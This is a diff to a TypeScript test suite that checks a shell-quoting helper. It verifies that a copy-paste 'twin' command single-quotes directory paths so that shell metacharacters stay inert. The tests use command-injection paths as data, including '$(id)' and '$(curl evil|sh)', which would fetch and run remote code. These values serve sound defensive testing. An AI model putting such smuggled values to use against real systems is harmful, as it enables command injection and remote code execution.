@@ -20,6 +20,7 @@ import {
   runClassFor,
   runKindFor,
   runOptionFlags,
+  shellQuote,
 } from "./spawn-contracts";
 
 const roots: string[] = [];
@@ -361,9 +362,52 @@ describe("runOptionFlags + cliTwin", () => {
       controlToken: "token-value",
     });
     const twin = cliTwin(plan);
-    expect(twin).toContain(`cd ${dir}`);
-    expect(twin).toContain("bun ");
+    expect(twin).toContain(`cd ${shellQuote(dir)}`);
+    expect(twin).toContain(dir);
+    expect(twin).toContain("bun");
     expect(twin).not.toContain("token-value");
+  });
+
+  test("the twin single-quotes EVERY word — a path with shell metacharacters is inert", () => {
+    // The twin is presented as "the exact command an operator could paste",
+    // next to a copy button. A directory name is attacker-influenceable on a
+    // shared mount, and the old rule (quote only when it contains a space,
+    // with JSON double-quotes) left `$( )`, backticks, `;` and `|` live in
+    // both branches.
+    const payload = "/srv/harnesses/acct$(id);`id`|id&x";
+    const quoted = shellQuote(payload);
+    expect(quoted).toBe(`'${payload}'`);
+    // Nothing outside the quotes for a shell to interpret.
+    expect(quoted.slice(1, -1)).not.toContain("'");
+
+    const withSpace = "/srv/my harness$(id)/h";
+    expect(shellQuote(withSpace)).toBe(`'${withSpace}'`);
+    // JSON.stringify — the old behaviour — leaves the substitution live.
+    expect(JSON.stringify(withSpace)).toContain("$(id)");
+    expect(shellQuote(withSpace).startsWith('"')).toBe(false);
+
+    // A literal quote is closed, escaped, reopened — the POSIX idiom.
+    expect(shellQuote("/srv/o'brien/h")).toBe("'/srv/o'\\''brien/h'");
+  });
+
+  test("a plan built under a metacharacter path yields a twin with nothing live in it", () => {
+    const evil = "/srv/h/acct$(curl evil|sh)";
+    const plan = buildSpawnPlan({
+      harnessDir: evil,
+      target: "channel",
+      processEnv: {},
+      bunBin: "/usr/bin/bun",
+      bundle: {
+        entry: "daemon.ts",
+        entryPath: `${evil}/dist/daemon.ts`,
+        bundleDir: `${evil}/dist`,
+      },
+    });
+    const twin = cliTwin(plan);
+    // Every metacharacter survives as TEXT inside single quotes…
+    expect(twin).toContain("$(curl evil|sh)");
+    // …and the only unquoted shell syntax is the `cd … && …` scaffold.
+    expect(twin.replace(/'[^']*'/g, "«»")).toBe("cd «» && «» «»");
   });
 });
 
